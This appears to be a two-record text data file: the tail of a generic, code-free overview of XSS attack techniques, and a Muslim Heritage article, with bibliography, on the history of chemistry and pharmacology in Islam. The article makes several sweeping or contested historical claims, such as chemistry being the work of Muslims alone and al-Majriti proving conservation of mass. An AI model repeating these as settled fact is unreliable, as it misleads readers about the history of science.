encoding sensitive data in URLs, attackers can bypass security measures and inject malicious code into websites.\n\n2. Using onload or onmouseover events - These events can be used to inject malicious code that runs when the page loads or when the mouse pointer hovers over an element.\n\n3. Using the document.cookie property - The cookie property can be manipulated to steal sensitive information or perform malicious actions.\n\n4. Using XMLHttpRequest (XHR) - By injecting malicious code into an XHR request, attackers can steal sensitive information or perform malicious actions.\n\nIn summary, XSS attacks can be dangerous and can lead to the theft of sensitive information or the performance of malicious actions. It is important to protect against XSS attacks by using security measures such as input validation and output encoding."}
{"text": "The Advent of Scientific Chemistry | Muslim Heritage\nUntil recently, the mainstream history of scientific ideas has failed to acknowledge numerous Islamic scientists and their great efforts and achievements throughout the centuries. This short article seeks to contribute in redressing this injustice by highlighting Muslim contributions and attitudes towards the progress of chemistry.\nSalim T S Al-Hassani* and Mohammed Abattouy**\nFigure 1: 15th-century European portrait of \"Geber\", the Latin name of Jabir ibn Hayyan: in Codici Ashburnhamiani 1166, Biblioteca Medicea Laurenziana, Florence (image in the public domain).\nBefore addressing the main subject of this article, an important remark needs to be made. It concerns the etymology and the root of the word \"alchemy\". The use of this word is a representative big corruption of science on the part of scholars, including Muslim-Arabic speaking scholars. The source of the corruption is two fold: linguistic and anti Muslim bias.\nAs far as the linguistic source goes, alchemy is just a bastard traduction of the Arabic word kimmiyâ (meaning quantity, and from which was derived al-kîmiya used to designate the science of chemistry,) preceded by the article \"al\" (which means the article \"the\"), and which the Arabs always use (like the French and others for that matter). Only Barron Carra de Vaux had had the presence of mind to pointing to this, however briefly [1]. The article \"al\" does not exist with respect to other sciences because as an instance Al-Tib (Arabic for medicine) is not the word we call medicine today, or Al-Riyadhiyat the word we use for mathematics. Somehow al-kîmia should be translated literally as The Chemistry and not Alchemy; in French \"la chimie\" and not l'alchimie. The fact that only Westerners translated or dealt with the subject, followed by rather shy Muslim scholars, the bastardised word of alchemy has remained, and has become the norm.\nFigure 2: Chemical apparatus depicted in two pages of the Alchemiae Gebri Arabis philosophi solertissimi libri (Bern, 1545). (Source).\nThe second reason, due to anti Muslim bias, explains why alchemy is still used instead of chemistry. The object of those with anti Muslim bias is to use scholarly methods, techniques and arguments, the open and the subtle. Here, the aim of these scholars is to avoid by all means making scientific and experimental chemistry a Muslim science. Chemistry is fundamentally based on experimentation with substances, turning one substance or matter into another by means of experimentation and laboratory work. This has been mainly the work of Muslims, and Muslims alone. Whilst the Greeks championed speculation and metaphysical analysis about chemical processes, the Muslims relied on experimentation. Such an approach was championed very early in particular by Al-Razi, who may be considered consequently the father of modern chemistry. And it is the Muslims who laid the foundations of this science as it will be shown in the following. Rather than admit that, or because of that, the scholars not familiar with Arabic scientific literature or holding prejudices in conceiving the progress of scientific ideas in history continue to use the word alchemy to refer to the Arabic chemical tradition, whilst it should be Chemistry. The consequence of both approaches leds, somehow, to lock the Muslim science into the corner of alchemy, which is mostly connected with cranks and frauds of all sorts and occult practices. In this context, only Western modern scientists such as Lavoisier, Berthelot and other scholars deserve to be called the chemists.\nFigure 3: Front cover of the first volume of the Corpus Alchemicum Arabicum, the Book of the Explanation of the Symbols (Kitab Hall Ar-Rumuz) by Muhammad Ibn Umail (Living Human Heritage Publications, Daimon Verlag, 2002).\nThus, it is hoped that Muslims, first, honest scholars, second, and then, those hostile to Islam, maybe, should start using the real word: Chemistry in connection with the large corpus produced within the scientific tradition of Islam on chemical processes, practices and chemical industry.\nGreek alchemy and Islamic chemistry\nWhilst relying on the Greek works to acquire their early notions in this subject, Muslim scientists soon realised the shortcomings of the Greek heritage in the field of chemistry. Indeed, although the Greek contribution to science served as the foundation of so much to build upon, its major weakness for instance was the Greek's reliance on abstract speculation to deal with chemical phenomena. This exercise was stimulating intellectually and to philosophical argumentation, but it hardly led to a quantitative study of chemical transformations. Thus, in the field of chemistry, soon after coming across the Greek output, the scholars of the Islamic lands decided to build a new and experimental science. In doing so, some of them continued using the old terminology and pursued the ancient aims, such as the stone of wisdom which converts base metals into gold and the elixir of life that permits eternal health and youthfulness [2].'\nFigure 4: European depiction of Al-Razi in the Latin version of one of his treatises translated by Gerard of Cremona in between 1250-60. (Image in the public domain).\nTo say that there were no Muslim cranks who used chemistry and experimentation to come out with rather crooked, fanciful ideas and results is wrong. Ibn Sina and Ibn Khaldun, both, the rigorous scientists they were, hit, and hard at them. This rejection of doubtful practices, in fact, pursues the early Muslim tradition of rejecting anything that was doubtful in terms of hadiths, and always making sure facts were backed by evidence. Hence both Ibn Sina and Ibn Khaldun attacked the experimentalists who, for instance, sought to turn ordinary metals into precious ones, gold in particular. Ibn Sina, for instance, in The Book of Minerals, denounces the artisans who dye metals in order to give them the outside resemblance of silver and gold. He asserts that fabrication of silver and gold from other metals is \"practically impossible and unsustainable from a scientific and philosophical point of view\" [3]. Ibn Khaldun, for his part, denounces the frauds of those who apply on top of silver jewellery a thin layer of gold, and make other manipulations of metals. To Ibn Khaldun, the divine wisdom wanted gold and silver to be rare metals to guarantee profits and wealth. Their disproportionate growth would make transactions useless and would `run contrary to divine wisdom [4].'\nIn the little known, easily readable and succinct book The Civilisation of Islam [5], Jean Mathe summarises well the achievements of Muslim chemists [6]. They discovered alcohol, nitric and sulphuric acids, silver nitrate and potassium. They also determined the weight of many bodies and mastered the technique of sublimation, crystallization and distillation. Muslim chemistry also took many industrial uses, including tinctures and their applications in tanning and textiles; distillation of plants and of flowers, the making of perfumes and therapeutic pharmacy. The works of one amongst them, Jabir ibn Hayyan, which Mathe says reaches 2000 (obviously an over-estimated figure, related to some of the controversies regarding the persona of Jabir) were the bible of European chemists until Lavoisier in the 18th century [7].'\nAlthough scientists such as al-Kindi, especially in his criticism of Greek's `chemistry,' and Ibn Sina's, in his Kitab al-shifa (the book of healing), devote some interest to the subject, and although there were tens of other Muslims who were involved in the science, there were primarily three Muslim chemists, truly masters of their science. These were in the chronology of their lives: Jabir, Al-Razi and al-Majriti.\nFigure 5: Arabic manuscript held in the British Library showing the distillation process in a treatise of chemistry. © The British Library, London.\nSo much controversy surrounds the figure of Jabir ibn Hayyan (722-815). This controversy is well summarised by Dunlop [8]. It mainly evolves around the issue of whether Jabir and the Latin Geber are one and the same scholar. Surely, Geber was the Latin counterpart of Jabir. However, Dunlop considers that the 3000 thousand or so works attributed to Jabir by many, especially some Muslim scholars, are an exaggeration. It is very likely that someone other than him must have written a big part of such a large corpus, and in view of the rather dubious, even dangerous connections then between the so called science of alchemy and the mystic and even occult practices, the person(s) might have preferred to take some prudent steps, using the name of Jabir to cover themselves with his fame and authority. Moreover, that great encyclopaedia of Muslim scholarship up to the 10th century, al-Fihrist by Ibn al-Nadim had its own doubts [9]. And al-Fihrist's record is absolutely impeccable. Still, even if Jabir is the author of only some hundreds of such treatises, it remains undoubtful that achievements would be considerable. Al-Faruqis [10] offer a very good account of some of such achievements. Some of Jabir's writings include Al Khawass al-kabir (the Great Book of Chemical properties), al-Mawazin (Weights and measures), Al-Mizaj (Chemical combination), and Al-Asbagh (Dyes). On top of that, he built a precise scale which weighed items 6, 480 times smaller than the ratl (approximately 0,5 kg). Before John Dalton by ten centuries, he defined chemical combinations as a union of the elements together, in too small particles for the naked eye to see, without loss of character. In addition, he invented a kind of paper that resisted fire and an ink that could be read at night. Jabir's other achievements, gathered from various sources [11], led him to perfect chemical processes such as sublimation, liquefaction, purification, amalgamation, oxidation, crystallization, distillation, evaporation, and filtration, which are described in detail. He also identified many new products, including alkalines, acids, salts, paints and greases. He prepared sulphuric acid, nitro-hydrochloric acid (used to dissolve some metals), caustic soda and a multitude of salts such as sulphates, nitrates and potassium and sodium carbonates. Jabir's works with metals and salts subsequently helped develop foundry techniques and glazing processes for tiles and other ceramics [12]. However, instead of focusing on his purely scientific contribution to chemistry, many non Muslim scholars dealing with the \"alchemy\" literature [13], prefer to dwell on the rather tedious, obscure, and un-scientific aspects of his work (or that of the other Geber) which involves celestial influences, mystical uses of figures and symbols, and other fanciful and folkloric matters of Greek and ancient origins (which were the very causes for Ibn Sina's and Ibn Khaldun's attacks on certain aspects of this science,) and which contribute to attach to the Muslims un-scientific practices.\nAl-Razi the experimantal chemist\nSomeone these scholars do not refer to for very long is Al-Razi. He was a pure rationalist, no nonsense scientist, who only believed in experimentation and concrete evidence, and never refrained from demolishing all previous speculative and erroneous conclusions, and he did so in every science he touched upon. Al-Razi was born in Rayy in Iran (250-318 H/864-932). Before he left chemistry for medicine, where he became one of the leading authorities, and occupied eminent functions in Baghdad as physician, he was also the founding father of truly modern chemistry. Al-Razi eliminated the symbolic, occult aspects that plagued the so called alchemy, and set up the firm foundations of modern chemistry. He, most of all, set up the laboratory in the modern sense, designing, describing and using more than twenty instruments. Both Anawati and Hill provide a good account of Al-Razi's elaborate laboratory [14], the precursor of the modern laboratory, and of which many parts are still in use today (although Hill mentions that, Anawati, like many others, chooses to ignore this fact, however important it is) [15]. This crucial contribution to science had amongst other impacts the development of modern pharmacy. Hence, Abu al-Mansur al-Muwaffaq mentions for the first time some chemical facts to distinguish certain medicines [16].\nAl-Razi himself was interested in the medical uses of chemical compounds [17]. In his work Secret of Secrets, he made the very useful classification of natural substances, dividing them into earthly, vegetable and animal substances, to which he also added a number of artificially obtained ones such as lead oxide, caustic soda, and various alloys. He went further in the cataloguing and description of his experiments, describing first the materials he used, then the apparatus, and methods and conditions of his experiments [18]. In the Secret of Secrets, he describes in great detail such chemical processes which he performed, and which have their modern equivalent form of distillation, calcination, crystallisation etc [19].\nFigure 6: Cover of Journal of Chemical Education, September 1995, where H.S. El Khadem published an article on an ancient alchemy lost text reproduced in the Keys of Wisdom by Al-Tughra'i (12th century) [20].\nThe last Muslim chemist to deserve mention here is the Spanish Muslim court scientist al-Majriti (from Madrid) (950-1007). He was particularly noted for his work Rutbat Al-Hakim (The Rank of the Wise), which amongst other things gives formulae and instructions for purification of precious metals. It was collected and put together in the year 1009, two years after his death. In this work, Al-Majriti was also the first to prove the principle of conservation of mass, credited eight centuries later to the French Lavoisier [21].\nOf course Muslim chemistry, like other sciences was heavily translated into Latin, and also into local languages, which explains its spread to Europe. Many of the manuscripts translated have anonymous authors, though. Robert of Chester, a 12th century scholar, translated Liber de compositione alchemise. At about the same time, Hugh of Santalla made the earliest Latin translation of lawh azzabarjad (the Emerald table). It is, as per usual, the Italian, Gerard of Cremona, who made the more valuable translations. Amongst others, he translated Al-Razi's study and classification of salts and alums (sulphates) and the related operations in De aluminibus et salibus, whose Arabic original is preserved [22]. Through its various versions, this work had a decisive influence on subsequent operations in the West, more generally on mineralogy [23]. Still, back to those earlier stages, Alfred of Sareshel translated the part of Ibn Sina's Kitab al-Shiffa (the Book of Healing) that deals with chemistry. It is, however, in fairly recent times that Muslim chemistry received the greater attention from more Western scholars, starting with Berthelot in the late 19th century, followed by Holmyard, Kraus, and above all Ruska, who give the best and most comprehensive account of Muslim chemistry, much of which unfortunately is inaccessible to non German speakers [24].\nChemistry at the service of pharmacology\nIn connection with chemistry, a large interest was devoted to pharmacology, which deserves to be fully and thoroughly addressed on its own merits, and to much deserved greater lengths. In recent studies, this subject was examined in the context of Arabic chemistry. It was with this intermediary that several works of Muslim scholars were published and analyzed, such as al-Kindi's and al-Zahrawi's chemical investigation aiming at the creation of drugs [25].\nFigure 7: An illuminated opening from the alchemical treatise The Proof Regarding Secrets of the Science of the Balance (Kitab al-Burhan fi asrar 'ilm al-mizan) by 'Izz al-Din Aydamir al-Jildaki (d. 1342/743 H). Undated copy made in Morocco in the late 19th century. National Library of Medicine, Bethesda, MA, MS A7, part 1, fols. 1b-2a. © NLM. (Source).\nThe Muslims used in many ways the same methods, means and techniques in both chemistry and pharmacology to produce drugs. Through their experimental methods, they prepared products they used for healing including camphor, alum, ambergris etc. Under Islam, spread the profession of pharmacist, the first shops were opened in the early 9th century in Baghdad. Those shops had to abide by strict rules, regularly visited by a Muhtasib (inspector or market inspector) who applied corporal punishment on pharmacists who adulterated drugs.\nMuslim pharmacists were the first to write regular pharmacopoeia, i.e. the cataloguing and the listing of drugs. The technical term used by Muslims was Aqrabadin, a word of Greek origin meaning list or register. According to Levey, the Muslims were excellent organisers of knowledge, and so their pharmacological texts were directed carefully along the many directions which were either promising or useful to the apothecary and medical practitioner. These treatises as a result generally are more or less within well delineated groups. Some of the major types of Muslim pharmacological literature are given by Levey as follows [26]:\n1) Medical formularies which include many kinds of compound drugs, pills, pastilles, powders, syrups, oils, lotions, dentifrices, etc.\n2) Books on poisons.\n3) Synonymatic: treatises in which are found lists of simples usually in alphabetical order to help the reader to identify the drug in other languages.\n4) Tabular, synoptic texts, whereby long texts are turned into tabular work for quick usage, and abstracts made of some treatises for the same purpose.\n5) Lists of materia medica which include therapeutic considerations and opinions of various writers on the subject, preparations of the drugs and descriptions.\n6) Substitute drugs in case one drug for whatever reason was not available, a substitute was provided.\n7) Works on medical specialities available either as separate treatises or as sections of large encyclopaedias of medicine.\nFigure 8: Pharmacist preparing drugs. From a MS of the Arabic translation of Dioscorides' Materia Medica. (Source).\nThere is a large collection of works on the subject legated by Muslim scholars. Sabur Ibn Sahl (d 869) was the first physician to initiate pharmacopoeia, describing a large variety of drugs and remedies to ailments. In the 10th century, Abu Mansur Muwaffaq of Herat wrote The foundations of the true properties of Remedies, where he described 585 drugs [27]. Al-Biruni (d. 1051) wrote one of the most valuable Islamic works on pharmacology entitled Kitab al-Saydanah (The Book of Drugs), where he gave detailed knowledge of the properties of drugs and outlined the role of pharmacy and the functions and duties of the pharmacist. Ibn Sina, too, described no less than 700 preparations, their properties, mode of action and their indications. He devoted in fact a whole volume to simple drugs in his Canon [28]. It would seem, however, that it is the works by Massawayh al-Maridini of Baghdad and Cairo, and Ibn al-Wafid of Spain, that had the largest impact. Both were printed in Latin more than fifty times, appearing as De Medicinis universalibus et particularibus by Mesue the younger, and the Medicamentis simplicibus by Abenguefit [29]. Peter of Abano (1250-1316) translated and added a supplement to the work of al-Maridini under the title De Veneris, thus making the work of al-Maridini the standard reference work in the West for the next centuries [30]. Another later work to demonstrate the heavy dependence on Muslim pharmacology is by Jacques Sylvius (1487-1555) [31].\nIn the following concluding remarks we summarise the salient points focused upon in the article. Alchemy and chemistry in Islam refer to the study of both traditional alchemy and early practical chemistry by Muslim scientists. The modern word alchemy itself was derived from the Arabic word al-kimia and it should be properly be applied to design chemistry in the modern sense.\nThe study of alchemy and chemistry often overlapped in the early Islamic world, but later there were disputes between the traditional alchemists and the practical chemists who discredited alchemy. Muslim chemists were the first to employ the experimental scientific method (as practised in modern chemistry). Chemists such as Jabir ibn Hayyan (Latinized as Geber) and al-Razi (Latinized as Rhazes) contributed key chemical discoveries, including: invention of the distillation apparatus (such as the alembic, still, and retort) which were able to fully purify chemical substances; creation of the muriatic (hydrochloric), sulfuric, nitric and acetic acids; use of soda and potash; invention of procedures to produce distilled water and purified distilled alcohol; applying chemical transformation in the industry of perfumery; the discovery that aqua regia, a mixture of nitric and hydrochloric acids, could dissolve the noblest metal.\nBesides these outstanding inventions, many chemical substances and apparatus that shaped the history of chemical processes are of Islamic origin. The words elixir, alembic and alcohol are of Arabic origin. From the Arabic names of al-natrun and al-qaliy, Latinized into Natrium and Kalium, come the modern symbols for sodium and potassium.\nAn early experimental scientific method for chemistry began emerging among early Muslim chemists. Jabir Ibn Hayyan clearly recognized and proclaimed the importance of experimentation. He said in substance that the first essential in chemistry is that one should perform practical work and conduct experiments, for he who performs not practical work nor makes experiments will never attain the least degree of mastery.\nMuhammed Al-Razi was the first in his Al-Shukuk 'ala Jalinus (Doubts about Galen), was the first to prove both Aristotle's theory of classical elements and Galen's theory of humorism wrong using an experimental method. He carried out an experiment which would upset these theories by inserting a liquid with a different temperature into a body resulting in an increase or decrease of bodily heat, which resembled the temperature of that particular fluid. Al-Razi noted particularly that a warm drink would heat up the body to a degree much higher than its own natural temperature, thus the drink would trigger a response from the body, rather than transferring only its own warmth or coldness to it. Al-Razi's chemical experiments further suggested other qualities of matter, such as \"oiliness\" and \"sulfurousness\", or inflammability and salinity, which were not readily explained by the traditional fire, water, earth and air division of elements. Al-Razi was also the first to distill petroleum, to invent kerosene and kerosene lamps, to invent soap bars and modern recipes for soap, to produce antiseptics, and to invent numerous chemical processes such as sublimation.\nFrom the 12th century CE, the writings of chemical works of Jabir, al-Kindi, al-Razi and others became widely known in Europe during the Arabic-Latin translation movement and later through the Latin writings of a mysterious author known in the literature as \"Pseudo-Geber\", an anonymous alchemist born in 14th century Spain, who translated more of Jabir's books into Latin and wrote some of his own books under the pen name of \"Geber\".\nThe authors would like to acknowledge the assistance and contribution of the following colleagues in the production and providing documentation for this article: Ms Kathy Mathews, Dr Salah Zaimeche, Dr Salim Ayduz and the staff of Joules and John Rylands Libraries at Manchester University.\nAl-Hassan, A. Y.: online articles at History of Science and Technology in Islam:\nA Critical Reassessment of the Geber Problem: Part One: The Emergence of the Geber Problem: Berthelot's Assumptions; Part Two: Jabir (Geber)'s Standing in the Latin West And the Translator of the Liber fornacum;Part Three: Berthelot's Motives in Choosing the Wrong Arabic Alchemical Treatises and the Extant Arabic Works of Jabir on Theoretical and Practical Alchemy and Chemistry.\nThe Geber Problem: The Origin of Liber Fornacum.\nAlcohol and the Distillation of Wine.\nSal Nitri and Sal Petrae In Geber's Latin Works.\nPotassium Nitrates in Arabic and Latin Sources.\nJabir's Latin Works and the Question of Geber.\nEighth century treatise on glass: Kitab al-Durra al-Maknuna (The Book of the Hidden Pearl of Jabir ibn Hayyan (c. 721–c. 815) On Coloured Glass, On Lustre, On Gemstones And Pearls: Part 1: The Manufacture of Coloured Glass; Part 2: Lustre Glass; Part 3: The Colouring Of Gemstones, The Purifying and Making of Pearls and Other Useful Recipes; Part 4: Assessment of Kitab al-Durra al-Maknuna.\nArabic Alchemy ('Ilm al-San'a): Science of the Art.\nAl-Hassan, Ahmad Yusuf (1987). \"Chemical Technology in Arabic Military Treatises. A Review of the Sources\". In: From Deferent to Equant. Edited by D.A. King and G. Saliba. New York: New York Academy of Science, pp. 153-166.\nAnawati, Georges (1996). \"Arabic Alchemy\". In: Encyclopaedia of the History of Arabic Science, edited by Roshdi Rashed. London: Routledge, pp. 853-885.\nArberry, A. J. (1950). The spiritual physick of Rhazes. London: J. Murray.\nBerthelot, M. (1893). La Chimie au Moyen Age. Vol. 3: L'Alchimie Arabe. Une introduction historique et les traités de Cratès, d'El-Habib, d'Ostanès et de Djâber. Texts and translations. Paris: Imprimerie nationale. Reprinted Amsterdam, Philo Press. 1968.\nBerthelot, M. and Duval, R. (1967). La chimie au Moyen Âge : comprenant une introduction et plusieurs traités d'Alchimie syriaques et arabes d'aprés les manuscrits du British Museum et de Cambridge. Osnabrück: Otto Zeller.\nBraccesco, G. (1562). La espositione di Geber filosofo. Vinegia: Appresso Gabriel Giolito de' Ferrari.\nBraccesco, G. and Bolton, H. C. (1548). De alchemia dialogi duo : quorum prior, genuinam librorum Gebri sententiam. Lugduni, Excudebant Godefridus & Marcellus Beringi fratres.\nCarra de Vaux, Bernard (1984). Les penseurs de l'Islam. 5 vols. Paris: Geunther, 1921-26. Vol. 2: Les Penseurs de l'Islam. 2: Les Géographes. Les sciences mathématiques et naturelles. Lausanne: Roth-Hotz reprise.\nCorbin, Henri, Lory, Pierre (1986). L'Alchimie comme art hiératique : textes. Paris: L'Herne.\nHaq, Seyyed Numan (1994). Names, natures, and things : the Alchemist Jabir ibn Hayyan and his Kitab al-Ahjar (Book of Stones). Dordrecht/Boston: Kluwer.\nHashimi, M. h. Y. h. (1958). al-Imam al-Sadiq : mulhim al-kimiya. Cairo: Al-mu'assasa al-Suriya al-Iraqiya.\nHolmyard Eric John (1931). Makers of Chemistry. Oxford: Clarendon Press.\nHolmyard, E. J. (1957). Alchemy. The story of the fascination of gold and the attempts of chemists. Harmondsworth, Middle- sex: Penguin Books, 1957, reprint 1968.\nGeber and Darmstaedter, E. (1922). Die Alchemie des Geber, übers. und erklärt von Ernst Darmstaedter. Berlin: Springer. Reprinted Die Alchemie des Geber. Wiesbaden: M. Sändig, 1969.\nGeber, Khalid ibn Yazid al-Katib, Philaletha and Bolton, H. C. (1753). Geberi des Königes der Araber, scharffinnigen Philosophi und wahren Adepti Curieuse vollständige chymische Schriften : worinnen in den vier Büchern das Quecksilber, Schwesel, Arsenicum, Gold, Silber, Bley, Zinn, Kupfer, Eisen [etc]. Wienn: J. P. Krauss.\nGeber and Newman, W. R. (1991). The Summa perfectionis of Pseudo-Geber : A Critical edition, translation and study. Leiden/New York: E.J. Brill.\nJabir ibn Hayyan (1928). The Arabic Works of Jabir Ibn Hayyan. Paris: Paul Geuthner.\nJabir ibn Hayyan (1983). Dix traités d'alchimie : les dix premiers traités du Livre des soixante-dix. French translation by Pierre Lory. Paris: Sindbad.\nJabir ibn Hayyan (1986). Jabir ibn Hayyan (8th century): Kitab al-Sab'in. The Book of Seventy. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nIbn Umayl (2002). Ibn Umayl Abu `Abd Allah Muhammad (fl. c. 300/912) : texts and studies. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nJabir ibn Hayyan (1988). Tadbir al-iksir al-a'zam : arba' 'asharah risalah fi san'at al-kimiya. Edition of the Arabic text by Pierre Lory. Damascus: al-Ma'had al-'Ilmi al-Faransi li-'l-Dirasat al-'Arabiya.\nJabir b, Hayyan (1986). Kitab al-Sab'in. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nJabir ibn Hayyan (2002). Jabir b. Hayyan : Texts and Studies. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nKhalid, F. (1984). Khalid ibn Yazid, siratuhu wa-ihtimamatuhu al-'ilmiyya. Dirasa fi al-'ulum 'inda al-'arab. Baghdad: Wizarat al-thaqafa wa-al-I'i'lam.\nKopp, H. (1869). Beiträge zur Geschichte der Chemie. Braunschweig: F. Vieweg und sohn.\nKraus, Paul (1942). Jabir ibn Hayyan : contribution à l'historire des idées scientifiques dans l'Islam. Le Caire: Impr. de l'Institut français d'archéologie orientale. Reprinted: Kraus, Paul (1986). Jabir Ibn Hayyan : contribution à l'histoire des idées scientifiques dans l'Islam : Jabir et la science grecque. Paris: Les Belles Lettres.\nKraus, Paul (1935). Jabir Ibn Hayyan. Textes choisis. Paris and Cairo.\nKraus, P., Brague, R. (1994). Alchemie, Ketzerei, Apokryphen im frühen Islam : gesammelte Aufsätze. Hildesheim: Georg Olms Verlag.\nKutbi, Z. (1996). Jabir ibn Hayyan. Damascus: Dar Talas.\nLivî, M. (1980). Al-Kîmiyâ' wa-l-taknûlûyiyâ al-kîmîya'iyya fî wâdî al-râfidîn. Baghdad: Dâr al-Hurriyya.\nLevey, Martin (1966). \"The Aqrabadhin of al-Kindi and Early Arabic Chemistry\", Chymia vol. 8.\nLevey, Martin (1962). \"Mediaeval Arabic Bookmaking and Its Relation to Early Chemistry and Pharmacology\". Transactions of the American Philosophical Society, vol. 52(4): 1–79.\nLevey, Martin (1973). Early Arabic Pharmacology: An Introduction Based on Ancient and Medieval Sources. Leiden: E. J. Brill.\nMahmud, Z. N. (1986). Jabir ibn Hayyan. Beirut: al-Markaz al-Arabi li-'l-thaqafa wa-al-'ulum. First edition1962.\nMarquet, Y. (1988). La philosophie des alchimistes et l'alchimie des philosophes : Jâbir ibn Hayyân et les \"Frères de la Pureté\". Paris: Maisonneuve et Larose.\nMartels, Z. R. W. M. v. (1990). Alchemy Revisited : Proceedings of the International Conference on the History of Alchemy at the University of Groningen, 17-19 April 1989. Leiden/New York: E.J. Brill.\nMeyerhoff, Max (1931). \"Science and Medicine\". In The Legacy of Islam, edited by Sir Thomas Arnold and A. Guillaume. Oxford University Press, pp. 311-55.\nMeyerhoff, Max (1935). \"Esquisse d'histoire de la pharmacologie et de la botanique chez les Musulmans d'Espagne,\" Al-Andalus vol. 3: pp. 1-41.\nNajib, H. (1991). Râ'id al-kîmiyâ al-'arabiyah: Jabir ibn Hayyan. Abu Dhabi: Dar al-Mutanabbi.\nPlessner, M. and Klein-Franke, F. (1975). Vorsokratische Philosophie und griechische Alchemie in arabisch-lateinischer Überlieferung : Studien zu Text und Inhalt der Turba philosophorum. Wiesbaden: F. Steiner.\nPrincipe, L. (2007). Chymists and chymistry : studies in the history of alchemy and early modern chemistry. Sagamore Beach, MA: Science History Publications.\nRazi, al-, Muhammad ibn Zakariya (1766). Rhazes de variolis et morbillis, arabice et latine; cvm aliis nonnvllis eivsdem argvmenti. Cvra et impensis Iohannis Channing. Londini, excvdebat Gvilielmvs Bowyer.\nRazi, al-, Muhammad ibn Zakariya (1964). Al-Asrar wa-sirr al-asrar. Tehran.\nRazi, al-, Muhammad ibn Zakariya (1964). Al-Sira al-Falsafiya. Tehran.\nRex, F. (1975). Zur Theorie der Naturprozesse in der Frü harabischen Wissenschaft : das Kitab al-Ihrag. Übersetzt und Erklärt, ein Beitrag zum alchemistischen Weltbild der äbir-schriften (8./10. Jahrhundert N.Chr.). Wiesbaden: Franz Steiner.\nRuska, Julius (1912). \"Al-Rasi (Rhases) als Chemiker\", Zeitschrift fur Angewandte Chemie vol. 35: pp. 719-24.\nRuska, Julius (1933). \"Die Alchemie des Avicenna,\" Isis vol. 21: pp. 14-51.\nRuska, Julius (1935). Das Buch der Alaune and salze. Berlin.\nRuska, J. (1935). \"Die Alchemie ar-Razi's\", Der Islam vol. 22,: pp. 281-319.\nRussell, Richard (1678). The works of Geber : the most famous Arabian prince and philosopher of the investigation and perfection of the philosophers-stone. London, Printed for William Cooper. Englished by R. Russel, 8°. London: Printed for William Cooper. Reedited by E. J. Holyard. London, 1928.\nSalmon, W., Khalid ibn Yazid, Jabir ibn Hayyan, Artephius, Flamel, N., et al. (1692). Medicina practica, or, Practical physick: shewing the method of curing the most usual diseases happening to humane bodies... to which is added, the philosophick works of Hermes Trismegistus, Kalid Persicus, Geber Arabus, Artesius Longvus, Nicholas Flammel, Roger Bachon and George Ripley : all translated out of the best Latin editions into English. London: Printed for T. Howkins, J. Taylor and J. Harris.\nSezgin, F. (2001). Chemistry and Alchemy. Texts and Studies. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nSezgin, F. et al. (edit.) (2002). Jabir Ibn Hayyan. Texts and Studies. Collected and reprinted. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\n[1] Barron Bernard Carra de Vaux, Les penseurs de l'Islam. 5 vols. Paris: Geunther, 1921-26. Vol. 2 is dedicated to sciences: Les Penseurs de l'Islam. 2: Les Géographes. Les sciences mathématiques et naturelles. Lausanne: Roth-Hotz reprise, 1984, p. 374.\n[2] M. Ali Kettani. \"Science and Technology in Islam: The underlying value system\", in Z. Sardar ed., The Touch of Midas; Science, values, and environment in Islam and the West; Manchester University Press, 1984, pp 66-90; p. 77.\n[3] Georges Anawati, \"Arabic Alchemy\", in Encyclopaedia of the History of Arabic Science, edited by Roshdi Rashed, London: Routledge, 1996, vol. 3, pp. 853-85; at p. 877. One has to be careful of Anawati's article, though. Whilst Ibn Sina and Ibn Khaldun never attacked the science of chemistry and real scientists, but just the crooked versions of it, Anawati, like others, eagerly generalises and accuses them of attacking the science itself. There is absolutely in neither Ibn Sina's work, who was himself a chemist to large extent, and in Ibn Khaldun's, one single instance of attack on the science itself.\n[5] It must be signalled that we find some regrettable errors in the book, most of all poor naming of the Muslim scientists, possibly due to print cookies; for example writing al-Birani (for al-Biruni, p. 120), Ibn Batoutah (for Ibn Batouah, p. 125).\n[6] Jean Mathe, The Civilisation of Islam, tr. by David Macrae, Crescent Books, New York.\n[7] Ibid, pp. 123-24.\n[8] D.M. Dunlop, Arab Civilisation 800-1500 A.D., Longman Group, 1971, pp. 209-11.\n[9] Bayard Dodge, The Fihrist of al-Nadim. A Tenth Century Survey of Muslim Culture, Columbia Records of Civilisation: Sources and Studies, No. LXXXIII, 2 vols, New York and London, 1970. The Fihrist is an absolute must for anyone seeking to know about Muslim scholarship up to the 10th century. By then, already, Muslim scholars counted in the thousands. And this growth continued in subsequent centuries, until the 16th at least.\n[10] Ismail R. and Lois Ibsen Al Faruqi, The Cultural Atlas of Islam. New York: Macmillan, 1986, p. 238.\n[11] Most particularly from A. M. Kettani, \"Science\", op. cit., p. 78, and Carra de Vaux, Les Penseurs de l'Islam, op. cit.\n[12] G.M. Wickens, \"The Middle East as a world centre of science and medicine\", in R. M. Savory, Introduction to Islamic Civilization, pp. 111-118, Cambridge University Press, 1976, pp. 111-118; p. 113.\n[13] For instance, Georges Anawati, \"Arabic alchemy\", op. cit., at pp. 865-7; C. A. Ronan, \"The Arabian Science\", in The Cambridge Illustrated History of the World's Science, Cambridge University press/Newness Books, 1983, pp. 201-244; pp. 237-38.\n[14] G. Anawati, \"Arabic Alchemy\", op. cit, p. 868; D.R. Hill, Islamic Science and Engineering. Edinburgh: Edinburgh University Press, 1993, p. 84.\n[15] This fact is highly important, though, as it demonstrates how Muslim science is still valid in many respects today.\n[16] E.J. Holmyard, Alchemy, London, 1957, p. 88, quoted in G. Anawati, \"Arabic Alchemy\", op. cit., p. 869.\n[17] C. A. Ronan, \"The Arabian\", op. cit., p. 239.\n[18] M. Ali Kettani, \"science\", op. cit., p. 79.\n[19] S. Nasr, Science and Civilization in Islam. Cambridge (Mass.): Harvard University Press, 1968, pp. 269-78. Nasr gives a good outline of some of Al-Razi's experiments on metals, preparation of caustic soda, use of Mercury Ammonium Chloride Solution as a dissolving reagent etc.\n[20] H. S. El Khadem, \"A Lost Text By Zosimos Reproduced in an Old Alchemy Book\", Journal of Chemical Education, vol. 72, Issue 9. In this article, the author presents an Arabic translation of a text entitled Keys of Wisdom by the famous 4th-century alchemist Zosimos, which has been found in an alchemy book written by a 12th century Arabic writer named Al-Tughra'i.\n[21] M. Ali Kettani, \"Science\", op cit, p. 79.\n[22] J. Ruska, Das Buch der Alaune and salze, Berlin, 1935, mentioned 